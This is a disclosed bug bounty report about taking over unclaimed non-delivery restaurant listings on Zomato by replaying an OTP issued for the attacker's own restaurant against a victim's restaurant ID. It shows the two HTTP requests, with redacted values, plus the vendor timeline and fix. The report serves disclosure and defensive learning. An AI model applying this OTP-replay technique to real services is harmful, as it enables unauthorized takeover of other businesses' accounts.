---
title: "Claiming the listing of a non-delivery restaurant through OTP manipulation"
author: ashoka_rao
url: https://hackerone.com/reports/1330529
date_published: 2021-09-05
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/1330529
bounty: "$3,250 total ($2,000 on triage + $750 bounty + $500 bonus)"
vuln_class: business-logic
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #1330529 to Eternal (Zomato). Status: Resolved. Severity: Critical (9.1), raised from High (8.1) by the program. Weakness: Improper Authorization. Disclosed February 22, 2022.

Summary by Eternal: Thanks to @ashoka_rao for reporting this issue. The researcher demonstrated a way to takeover an unclaimed non-delivery restaurant on our platform.

## Report body (ashoka_rao, September 5, 2021)

**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp` sends OTP to the restaurant mobile no.

### Request 1

```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: [REDACTED]
X-Zomato-Csrft: [REDACTED]
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Referer: https://www.zomato.com/partner_with_us/ownership
(other standard browser headers omitted)

{"number":"[REDACTED]","isdCode":"+91","resId":"[REDACTED]"}
```

Response:

```
{"status":"success","message":"OTP SENT","requestId":[REDACTED],"code":2}
```

Here the attacker gains the OTP on his own mobile number by changing `number` and `resId` to his own restaurant.

### Request 2
Using the following request the attacker is able to map his e-mail ID as Owner / Manager to the victim restaurant.

```
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: [REDACTED]
X-Zomato-Csrft: [REDACTED]
Content-Type: application/json;charset=UTF-8

{"verificationCode":[REDACTED],"requestId":"[REDACTED]","resId":"[REDACTED]"}
```

Here the `verificationCode` (OTP received on the attacker's mobile from Request 1) and `requestId` (from Request 1 response) are reused, with `resId` changed to the victim restaurant. Request 2 maps the attacker's email to the victim restaurant.

**Prerequisite:** Attacker should have a restaurant page, mapped mobile no with email id.

**Note:** If any restaurant is not mapped to an owner / manager then it can be claimed.

### Impact
Claim a restaurant.

## Timeline / vendor responses
- Sept 5, 2021: Eternal staff acknowledged, asked for res ids taken over; researcher supplied one. Severity raised high (8.1) to critical (9.1). Triaged and reproduced. $2,000 paid on triage ("Given the severity of the report, we are paying an initial $2000 on triage").
- Sept 13, 2021: additional $750 bounty and $500 bonus; severity determined critical.
- Sept 22, 2021: fix deployed, researcher asked to confirm. Needs more info status briefly.
- Oct 4, 2021: Resolved, fix verified internally.
- Feb 22, 2022: disclosed; title changed from redacted title to current title.

## Metadata
Reported on September 5, 2021. Participants: ashoka_rao, bhelpuri, cholepuri, panipuri. CVE: none.

Key pattern: the verify step trusts the OTP/requestId pair without binding it to the resId (the resource) the OTP was issued for, so an OTP obtained for the attacker's own resource validates against a victim resource.
